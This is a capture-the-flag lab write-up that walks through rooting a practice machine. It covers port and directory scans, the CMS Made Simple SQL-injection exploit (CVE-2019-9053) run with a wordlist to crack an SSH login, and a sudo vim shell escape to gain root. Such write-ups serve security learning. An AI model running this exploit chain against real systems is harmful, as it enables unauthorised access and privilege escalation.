- - - 
created : 17-07-2025 

Tags : #easy  
- - - 
# Objective

Root the machine . 
# Recon
## Nmap

We can use [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) to scan our target :

```
    21/tcp open ftp
    80/tcp open http  
    2222/tcp open ssh
```

opening http we get Apache2 Ubuntu Default Page (noinfo).
# Enumeration
## Gobuster

We can use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to perform first [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on directories on the target :

```
    /simple
```

visiting the /simple directory we find the Copiright at the bottom of the page saying ==**CMS Made Simple version 2.2.8**==

## Searchsploit / ExploitDB

using [Searchsploit](../../3%20-%20Tags/Hacking%20Tools/Searchsploit.md) in [Kali Linux](../../3%20-%20Tags/Hacking%20Tools/Kali%20Linux.md) we can find multiple choices, we can see there's [SQL Injection](../../3%20-%20Tags/Hacking%20Concepts/SQL%20Injection.md) :

<img src="../../Flameshots/0234bae202bf67778940868e1c1d35bc.png" alt="0234bae202bf67778940868e1c1d35bc.png" width="368" height="420" class="jop-noMdConv">

we can copy it to our working directory from **[ExploitDB](../../3%20-%20Tags/Hacking%20Tools/ExploitDB.md)**

`cp /usr/share/exploitdb/exploits/php/webapps/46635.py .`

and read it to see it's [CVE-2019-9053](../../3%20-%20Tags/CVEs/CVE-2019-9053.md) 

# Exploit
## Cracking

we can crack the username and password with the [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) code :

`python2.7 46635.py http://10.10.50.86/simple --crack -w usr/share/wordlists/rockyou.txt`

and we find ==**mitch**== for user and **==secret==** as password. 

## SSH

Here we use the credentials to access **[SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md)** on port **2222  `ssh mitch@IP -p 2222`**  than we can `cat user.txt` for the first [Flag](../../3%20-%20Tags/Hacking%20Concepts/Flag.md)  .

# Privilege Escalation

Now that we are in we have to escalate to the root flag so we see what we can sudo with user without passwd : `sudo -l` >>  `/usr/bin/vim (NOPASSWD)`

we can search for [GTFObins](../../3%20-%20Tags/Hacking%20Tools/GTFObins.md) SUDO, and execute the command on the Target Machine  `<span style="color: rgb(224, 62, 45);">sudo vim -c ':!/bin/sh'</span>`

confirm that we are root `whoami` and `cd root ; cat root.txt` to complete .